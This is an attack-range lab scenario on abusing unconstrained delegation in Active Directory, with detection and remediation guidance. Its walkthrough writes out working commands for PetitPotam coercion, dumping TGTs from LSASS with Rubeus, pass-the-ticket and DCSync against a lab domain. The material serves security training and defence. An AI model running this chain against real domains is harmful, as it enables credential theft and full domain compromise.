# Scenario 3 - Unconstrained Delegation

| | |
|---|---|
| **MITRE ATT&CK** | T1558 - Steal or Forge Kerberos Tickets; T1187 - Forced Authentication |
| **Toggle** | `misconfig.unconstrained_delegation` |
| **Role** | `misconfig_unconstrained_delegation` |
| **Host** | `SRV-APP01` (`TrustedForDelegation = $true`) |
| **Foothold** | Local admin on `SRV-APP01` |

## Objective

Capture a reusable TGT for a privileged account by coercing it to authenticate
to a host trusted for unconstrained delegation, then impersonate it.

## Seeded configuration

`SRV-APP01` is marked `TrustedForDelegation`. Any account authenticating to it
leaves a reusable TGT in LSASS that can be extracted.

## Attack walkthrough

```bash
# 1. Get a foothold with local admin on SRV-APP01 (e.g. via the scenario 1
#    service account, or the SQL path).
# 2. Coerce a domain controller into authenticating to SRV-APP01.
#    PetitPotam (MS-EFSRPC) is the classic trigger.
python3 PetitPotam.py 10.10.20.x 10.10.10.10        # DC -> SRV-APP01

# 3. On SRV-APP01, monitor for the incoming TGT and dump it from LSASS.
Rubeus.exe monitor /interval:5 /nowrap
Rubeus.exe dump /nowrap

# 4. Inject the captured DC machine TGT, then DCSync with it.
Rubeus.exe ptt /ticket:<base64>
impacket-secretsdump -k -no-pass corp.contoso.lab/DC01$@DC01.corp.contoso.lab
```

Coercion can also be chained from the constrained-delegation host in scenario 4.

### BloodHound view

`SRV-APP01` shows **Unconstrained Delegation**. The engine reports
`Unconstrained delegation` (critical).

## Detection

- **4624** logon type 3 on `SRV-APP01` from a DC account.
- **Sysmon 10** - LSASS process access by `Rubeus`/`mimikatz`.
- DC-side: MS-EFSRPC/MS-RPRN calls originating from the range subnet
  (PetitPotam/PrinterBug) — event **5145** or named-pipe telemetry.

## Remediation

- Remove unconstrained delegation; use resource-based constrained delegation
  (RBCD) where delegation is genuinely required.
- Add Tier 0 accounts to **Protected Users** and mark them "Account is
  sensitive and cannot be delegated".
- Disable Print Spooler and EFSRPC on domain controllers.

## References

- MITRE T1558, T1187
- Microsoft: "Securing privileged access"
